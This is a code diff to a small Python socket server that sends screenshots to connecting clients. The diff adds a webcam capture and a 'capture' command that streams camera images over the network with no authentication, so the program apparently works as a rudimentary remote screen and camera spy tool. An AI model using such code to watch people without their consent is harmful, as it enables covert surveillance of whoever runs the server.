@@ -2,6 +2,8 @@ import socket
 import threading
 import os
 import pyautogui
+import cv2 as cv
+
 
 HEADER = 64 
 PORT = 5000
@@ -24,6 +26,20 @@ def broadcast(msg: str):
 
 def screenshot():
     pyautogui.screenshot("tempimage.png")
+
+
+def cameraCapture():
+    # Initalize OpenCV
+    cam_port = 0
+    cam = cv.VideoCapture(cam_port)
+
+    result, image = cam.read()
+
+    if result:
+        cv.imwrite("tempcapture.png", image)
+    else:
+        print("No image detected. Please! try again")
+
 
 def handleConnection(conn: socket, addr):
     print(f"{addr} has connected!")
@@ -50,6 +66,13 @@ def handleConnection(conn: socket, addr):
                     conn.send(str(size).encode(FORMAT))
                     data = temp.read()
                     conn.sendall(data)
+                elif msg == "capture":
+                    cameraCapture()
+                    f = open("tempcapture.png", "rb")
+                    size = os.path.getsize("tempcapture.png")
+                    conn.send(str(size).encode(FORMAT))
+                    data = f.read()
+                    conn.sendall(data)
 
 
 def main():
@@ -60,6 +83,7 @@ def main():
         conn, addr = server.accept()
         thread = threading.Thread(target=handleConnection, args=(conn, addr))
         thread.start()
+
 
 if __name__ == "__main__":
     main()
